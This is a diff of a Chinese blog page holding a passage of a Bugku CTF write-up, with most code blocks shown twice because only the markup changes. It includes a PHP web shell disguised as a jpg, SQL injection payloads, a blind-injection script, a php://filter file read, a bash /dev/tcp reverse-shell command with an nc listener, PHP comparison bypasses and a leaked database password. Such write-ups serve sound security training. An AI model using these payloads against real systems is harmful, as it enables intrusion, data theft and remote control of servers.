class="number">7</span>] == <span class="string">'619c20c'</span> <span class="keyword">and</span> sha[<span class="number">8</span>] == <span class="string">'a'</span> <span class="keyword">and</span> sha[<span class="number">16</span>] == <span class="string">'9'</span>:</span><br><span class="line">					print(password)</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">keys = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(s)</span>:</span></span><br><span class="line">    sha1_hash = hashlib.sha1()</span><br><span class="line">    sha1_hash.update(s)</span><br><span class="line">    <span class="keyword">return</span> sha1_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">		<span class="keyword">for</span> p <span class="keyword">in</span> keys:</span><br><span class="line">			<span class="keyword">for</span> q <span class="keyword">in</span> keys:</span><br><span class="line">				password = i + <span class="string">'7'</span> + j + <span class="string">'5-'</span> + p + <span class="string">'4'</span> + q + <span class="string">'3?'</span> </span><br><span class="line">				sha = sha1(password.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">				<span class="keyword">if</span> sha[<span class="number">0</span>:<span class="number">7</span>] == <span class="string">'619c20c'</span> <span class="keyword">and</span> sha[<span class="number">8</span>] == <span class="string">'a'</span> <span class="keyword">and</span> sha[<span class="number">16</span>] == <span class="string">'9'</span>:</span><br><span class="line">					print(password)</span><br></pre></td></tr></table></figure>
 <p>得到密码 <code>I7~5-s4F3?</code> ，第三次解开！</p>
 <p>第四层要求两个exe文件md5值相同但是输出不同，网上查找了一下还真的是有，一个文件输出 <code>Hello World ;-)</code> ,另一个输出 <code>Goodbye World :-(</code> ，以此为密码即可解开</p>
 <p>第五层折腾了好久，RSA题目做的太少了，用openssl打开ssl文件看一下</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -in rsa_public_key.pem -text -modulus</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -in rsa_public_key.pem -text -modulus</span><br></pre></td></tr></table></figure>
 <p>可以看到e很大，也就是指数很大，网上找了一下有个wienerattack攻击，用脚本跑一下可以得到d</p>
 <blockquote>
 <p>8264667972294275017293339772371783322168822149471976834221082393409363691895</p>
 </blockquote>
 <p>那么接下来就是生成私钥了，github上有个ctftool可以生成私钥</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -f PEM -o key.pem -n 46065780722597 -d 826466 -e 3546</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -f PEM -o key.pem -n 46065780722597 -d 826466 -e 3546</span><br></pre></td></tr></table></figure>
 <p>PS：篇幅所限，数字我都缩小了</p>
 <p>然后利用生成的私钥解密</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey key.pem -out 1.txt</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey key.pem -out 1.txt</span><br></pre></td></tr></table></figure>
 <p>然后即可得到flag。</p>
-
-        <h1 id="web">
-          <a href="#web" class="heading-link"><i class="fas fa-link"></i></a>web</h1>
-      
-        <h2 id="文件上传2">
-          <a href="#文件上传2" class="heading-link"><i class="fas fa-link"></i></a>文件上传2</h2>
-      <p>这个题目有点难，找了半天的资料，刚开始什么也没有，查看元素发现有个 <code>upload.php</code>，打开发现只能上传图片，试了各种方法都没有用，最后百度了一下找到了方法，直接上传jpg文件，内容如下:</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; system($_REQUEST[a])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></div></figure>
-<p>发现成功上传，传递参数<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;upload&#x2F;201803160110346459.jpg&amp;a&#x3D;ls</span><br></pre></td></tr></table></div></figure></p>
-<p>有个txt文件，查看一下<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;upload&#x2F;201803160110346459.jpg&amp;a&#x3D;cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt</span><br></pre></td></tr></table></div></figure></p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h2><p>这个题目有点难，找了半天的资料，刚开始什么也没有，查看元素发现有个 <code>upload.php</code>，打开发现只能上传图片，试了各种方法都没有用，最后百度了一下找到了方法，直接上传jpg文件，内容如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; system($_REQUEST[a])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>发现成功上传，传递参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;upload&#x2F;201803160110346459.jpg&amp;a&#x3D;ls</span><br></pre></td></tr></table></figure></p>
+<p>有个txt文件，查看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;upload&#x2F;201803160110346459.jpg&amp;a&#x3D;cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt</span><br></pre></td></tr></table></figure></p>
 <p>如此可得到flag</p>
-
-        <h2 id="flag-php">
-          <a href="#flag-php" class="heading-link"><i class="fas fa-link"></i></a>flag.php</h2>
-      <p>点了确实没反应，看了提示是 <code>hint</code>，原来是要get一个hint参数为1， <code>?hint=1</code>，即可得到源代码，审计一下，只要使cookie中的ISecer的反序列化值与<strong><font face="futura">$EKY</font></strong>的反序列化全等即可。但要注意的是$KEY在序列化之前，即<code>$KEY=’’</code>，序列化为 <code>s:0:””</code></p>
-
-        <h2 id="报错注入">
-          <a href="#报错注入" class="heading-link"><i class="fas fa-link"></i></a>报错注入</h2>
-      <p>题目主要过滤了空格，可以用 <code>/**/</code>绕过，这里介绍个 <font face="futura">load_file(filename)</font>可以查看文件，然后慢慢截取即可</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#x2F;**&#x2F;and&#x2F;**&#x2F;updatexml(1,concat(0x7e,(concat(substr(load_file(0x2F7661722F746573742F6B65795F312E706870),100,30))),0x7e),1)</span><br></pre></td></tr></table></div></figure>
+<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>点了确实没反应，看了提示是 <code>hint</code>，原来是要get一个hint参数为1， <code>?hint=1</code>，即可得到源代码，审计一下，只要使cookie中的ISecer的反序列化值与<strong><font face="futura">$EKY</font></strong>的反序列化全等即可。但要注意的是$KEY在序列化之前，即<code>$KEY=’’</code>，序列化为 <code>s:0:””</code></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>题目主要过滤了空格，可以用 <code>/**/</code>绕过，这里介绍个 <font face="futura">load_file(filename)</font>可以查看文件，然后慢慢截取即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#x2F;**&#x2F;and&#x2F;**&#x2F;updatexml(1,concat(0x7e,(concat(substr(load_file(0x2F7661722F746573742F6B65795F312E706870),100,30))),0x7e),1)</span><br></pre></td></tr></table></figure>
 <p>但是有一个地方贼坑，就是提交flag时的引号，一定要用题目里面要求的引号，不是英文的引号！！！</p>
-
-        <h2 id="sql注入2">
-          <a href="#sql注入2" class="heading-link"><i class="fas fa-link"></i></a>sql注入2</h2>
-      <p>发现文件泄露，访问flag即可(贼几把坑)</p>
-
-        <h2 id="文件上传2-湖湘杯">
-          <a href="#文件上传2-湖湘杯" class="heading-link"><i class="fas fa-link"></i></a>文件上传2(湖湘杯)</h2>
-      <p>这道题目没做出来，每次做文件上传类题目的时候总是没思路，这次看了别人的思路，直接文件读取居然就可以了。</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.24.86.145:9011&#x2F;?op&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="孙xx的博客">
-          <a href="#孙xx的博客" class="heading-link"><i class="fas fa-link"></i></a>孙xx的博客</h2>
-      <p>扫描旁站发现一个PHPmyadmin，查看博客内容</p>
+<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>发现文件泄露，访问flag即可(贼几把坑)</p>
+<h2 id="文件上传2-湖湘杯"><a href="#文件上传2-湖湘杯" class="headerlink" title="文件上传2(湖湘杯)"></a>文件上传2(湖湘杯)</h2><p>这道题目没做出来，每次做文件上传类题目的时候总是没思路，这次看了别人的思路，直接文件读取居然就可以了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.24.86.145:9011&#x2F;?op&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure>
+<h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>扫描旁站发现一个PHPmyadmin，查看博客内容</p>
 <blockquote>
 <p>MySQL数据库用户名<br>define(‘DB_USER’, ‘wp’);</p>
 </blockquote>
 <p> MySQL数据库密码<br>define(‘DB_PASSWORD’, ‘wzTrzYRdbrbyjAx’); </p>
 <p>登录即可找到flag</p>
-
-        <h2 id="login-SKCTF">
-          <a href="#login-SKCTF" class="heading-link"><i class="fas fa-link"></i></a>login(SKCTF)</h2>
-      <p>题目提示是SQL布尔盲注，username字段过滤了空格等常用字符，还有逻辑符号等，新学到一个<strong><font face="futura">mid()</font></strong>函数，可以绕过for和逗号</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;^(ascii(mid((password)from(1)))&lt;&gt;55)^0#&amp;password&#x3D;123</span><br></pre></td></tr></table></div></figure>
+<h2 id="login-SKCTF"><a href="#login-SKCTF" class="headerlink" title="login(SKCTF)"></a>login(SKCTF)</h2><p>题目提示是SQL布尔盲注，username字段过滤了空格等常用字符，还有逻辑符号等，新学到一个<strong><font face="futura">mid()</font></strong>函数，可以绕过for和逗号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;^(ascii(mid((password)from(1)))&lt;&gt;55)^0#&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
 <p>直接上脚本即可</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.219.210:49167/"</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">flag_yes = <span class="string">'error'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">start = <span class="number">1</span></span><br><span class="line">end_signal = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span>(end_signal):</span><br><span class="line">	end_signal = <span class="literal">False</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">		payload = <span class="string">"admin'^(ascii(mid((password)from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(start),str(j))</span><br><span class="line">		data[<span class="string">'username'</span>] = payload</span><br><span class="line">		res = requests.post(url,data=data).text</span><br><span class="line">		<span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			start += <span class="number">1</span></span><br><span class="line">			end_signal = <span class="literal">True</span></span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.219.210:49167/"</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">flag_yes = <span class="string">'error'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">start = <span class="number">1</span></span><br><span class="line">end_signal = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span>(end_signal):</span><br><span class="line">	end_signal = <span class="literal">False</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">		payload = <span class="string">"admin'^(ascii(mid((password)from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(start),str(j))</span><br><span class="line">		data[<span class="string">'username'</span>] = payload</span><br><span class="line">		res = requests.post(url,data=data).text</span><br><span class="line">		<span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			start += <span class="number">1</span></span><br><span class="line">			end_signal = <span class="literal">True</span></span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p><strong>注意：</strong>解出后的密码要md5解密，怪我太年轻。</p>
-
-        <h2 id="PHP-encrypt-1-ISCCCTF">
-          <a href="#PHP-encrypt-1-ISCCCTF" class="heading-link"><i class="fas fa-link"></i></a>PHP_encrypt_1(ISCCCTF)</h2>
-      <p>这个题目应该是有漏掉东西，没有给出加密后的密文，网上找一下密文，反向破解即可，贴上代码<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>  <span class="comment"># 题目中应该给出的密文串</span></span><br><span class="line"></span><br><span class="line">plain = base64.b64decode(cipher)</span><br><span class="line">plain = plain.decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line">plain1 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造题目中的md5串</span></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="string">b'ISCC'</span>)</span><br><span class="line">key = m.hexdigest()</span><br><span class="line">char = <span class="string">''</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	<span class="keyword">if</span> x == len(key):</span><br><span class="line">		x = <span class="number">0</span></span><br><span class="line">	char += key[x]</span><br><span class="line">	x += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">numflag = []    <span class="comment"># 明文ascii码值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Is_OK</span><span class="params">(number)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> number &gt;= <span class="number">33</span> <span class="keyword">and</span> number &lt; <span class="number">127</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		tmp = <span class="number">128</span> * j + ord(plain[i]) - ord(char[i])</span><br><span class="line">		<span class="keyword">if</span> Is_OK(tmp):</span><br><span class="line">			numflag.append(tmp)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> numflag:</span><br><span class="line">	print(chr(i),end=<span class="string">""</span>)</span><br></pre></td></tr></table></div></figure></p>
-
-        <h2 id="login2-SKCTF">
-          <a href="#login2-SKCTF" class="heading-link"><i class="fas fa-link"></i></a>login2(SKCTF)</h2>
-      <p>这题纯学习姿势，先正常发送请求，抓包发现提示是 <code>tips</code>，base64解码，是一段php代码<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;&#125;</span><br></pre></td></tr></table></div></figure></p>
+<h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>这个题目应该是有漏掉东西，没有给出加密后的密文，网上找一下密文，反向破解即可，贴上代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>  <span class="comment"># 题目中应该给出的密文串</span></span><br><span class="line"></span><br><span class="line">plain = base64.b64decode(cipher)</span><br><span class="line">plain = plain.decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line">plain1 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造题目中的md5串</span></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="string">b'ISCC'</span>)</span><br><span class="line">key = m.hexdigest()</span><br><span class="line">char = <span class="string">''</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	<span class="keyword">if</span> x == len(key):</span><br><span class="line">		x = <span class="number">0</span></span><br><span class="line">	char += key[x]</span><br><span class="line">	x += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">numflag = []    <span class="comment"># 明文ascii码值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Is_OK</span><span class="params">(number)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> number &gt;= <span class="number">33</span> <span class="keyword">and</span> number &lt; <span class="number">127</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		tmp = <span class="number">128</span> * j + ord(plain[i]) - ord(char[i])</span><br><span class="line">		<span class="keyword">if</span> Is_OK(tmp):</span><br><span class="line">			numflag.append(tmp)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> numflag:</span><br><span class="line">	print(chr(i),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p>
+<h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p>这题纯学习姿势，先正常发送请求，抓包发现提示是 <code>tips</code>，base64解码，是一段php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>题目也提示了union绕过，payload</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; union select md5(1),md5(1)#&amp;password&#x3D;1</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; union select md5(1),md5(1)#&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>
 <p>如此即可绕过，登录后是个命令执行，接下来开始重要姿势！！！！</p>
 <p><strong>反弹shell</strong></p>
 <p>你的linux主机上监听一下端口</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvv 8888</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvv 8888</span><br></pre></td></tr></table></figure>
 <p>然后执行命令</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;你的ip地址&#x2F;8888 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;你的ip地址&#x2F;8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 <p>如此即可成功反弹到shell!!!!(233333)</p>
 <p>然后读文件即可</p>
 <p><img src="/2018/04/03/bugku-writeup%E7%BB%AD/1.png" alt></p>
-
-        <h1 id="代码审计">
-          <a href="#代码审计" class="heading-link"><i class="fas fa-link"></i></a>代码审计</h1>
-      
-        <h2 id="md5加密相等绕过">
-          <a href="#md5加密相等绕过" class="heading-link"><i class="fas fa-link"></i></a>md5加密相等绕过</h2>
-      <p>payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;240610708</span><br></pre></td></tr></table></div></figure></p>
-
-        <h2 id="ereg正则-00截断">
-          <a href="#ereg正则-00截断" class="heading-link"><i class="fas fa-link"></i></a>ereg正则%00截断</h2>
-      <p>好坑啊，提交了一个 <code>?password=9e9%00-</code>老是不对，没想到居然是 <code>?password=9e9%00*-*</code>,哎，扎心了…</p>
-
-        <h2 id="extract变量覆盖">
-          <a href="#extract变量覆盖" class="heading-link"><i class="fas fa-link"></i></a>extract变量覆盖</h2>
-      <p>比较简单，payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?shiyan&#x3D;flag&amp;flag&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">flag</span><br></pre></td></tr></table></div></figure></p>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;240610708</span><br></pre></td></tr></table></figure></p>
+<h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>好坑啊，提交了一个 <code>?password=9e9%00-</code>老是不对，没想到居然是 <code>?password=9e9%00*-*</code>,哎，扎心了…</p>
+<h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p>比较简单，payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?shiyan&#x3D;flag&amp;flag&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">flag</span><br></pre></td></tr></table></figure></p>
 <p>第二行以post方式提交</p>
-
-        <h2 id="urldecode二次编码饶过">
-          <a href="#urldecode二次编码饶过" class="heading-link"><i class="fas fa-link"></i></a>urldecode二次编码饶过</h2>
-      <p>题目关键点在于，<strong><font face="futura">$_GET[]</font></strong>会先对得到的参数进行一次url解码，然后在函数中又进行了一次解码，所以会产生二次编码漏洞。<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%2568%2561%2563%256B%2565%2572%2544%254A</span><br></pre></td></tr></table></div></figure><br>二次编码后提交即可。</p>
-
-        <h2 id="md5函数">
